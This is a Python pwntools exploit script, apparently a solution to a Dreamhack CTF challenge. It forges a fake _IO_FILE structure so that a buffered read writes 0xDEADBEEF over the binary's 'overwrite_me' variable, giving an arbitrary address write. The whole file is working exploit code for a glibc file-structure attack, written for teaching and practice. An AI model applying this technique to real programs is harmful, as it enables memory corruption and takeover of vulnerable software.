from pwn import *

port= 14264
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/_IO_FILE Arbitrary Address Write/problem/iofile_aaw")

overwrite_addr = elf.symbols['overwrite_me']

payload = p64(0xfbad2488)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(overwrite_addr) # _IO_buf_base
payload += p64(overwrite_addr + 1024) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) # stdin

rem.sendlineafter(b'Data: ', payload)
sleep(1)
rem.send(p64(0xDEADBEEF) + b'\x00' * 1024)

print(rem.recvline().rstrip())